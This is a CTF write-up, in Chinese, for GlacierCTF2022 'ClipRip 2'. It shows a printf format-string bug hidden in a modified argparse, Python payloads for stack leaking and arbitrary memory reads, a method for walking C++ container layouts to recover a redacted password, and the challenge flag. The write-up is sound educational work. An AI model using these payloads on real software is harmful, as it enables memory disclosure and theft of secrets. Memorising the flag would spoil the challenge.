# GlacierCTF2022 - ClipRip 2

## 题目简述

题目复用 ClipRip 剪贴板服务，但第二个密码条目被标记为敏感内容，正常 `list` 只显示方块。程序集成了一份被修改的 C++ argparse；解析以 `-?` 开头的参数时，会把整个参数直接作为 `printf` 格式串，形成远程格式化字符串漏洞。

## 解题过程

漏洞位于 argparse 的参数循环：

```cpp
if (params[i].size() > 1 && params[i][1] == '?') {
    std::printf(params[i].c_str());
}
```

先发送大量 `%p_` 枚举栈参数：

```python
io.sendline(b"restore -?" + b"%p_" * 150)
stack_values = io.readline().split(b"_")
```

随后构造任意地址读取。官方 solver 把目标地址作为另一个命令参数放进进程栈，再用足够数量的 `%x` 消耗参数，最后以 `%s` 解引用；用分隔符取回泄漏内容：

```python
payload = b"restore " + p64(address) + b" -?" + b"%x" * 110
io.sendline(payload + b"|%s|")
leak = io.readline().split(b"|")[1]
```

ASLR 下不能硬编码 `Clipboard` 对象地址。对第一轮泄漏中的栈指针逐个做两级读取，若最终字符串含 `/wlclipmgr/`，便可确认它指向对象中的页面路径。按官方二进制的 libstdc++ 布局，越过两个 `fs::path` 字段后到达 `entries_` deque；再沿 deque 首块、`ClipboardEntry` 和其首字段 `std::vector<char>` 的数据指针解引用，即可直接读出被 `redact_` 隐藏的第二个密码：

```text
glacierctf{4ll_th3_th1dr_p4rtys_f4ult_cry}
```

这条路线只使用任意读，不需要执行 README 提到的可选 shellcode。

## 方法总结

将用户字符串作为 `printf` 的第一个参数会立即暴露地址泄漏与任意读写能力，即使漏洞藏在第三方参数解析库中也一样。C++ 容器只是内存布局更复杂；一旦能识别对象内稳定的路径字符串，就可把它作为锚点继续遍历 deque、entry 和底层字符缓冲区。
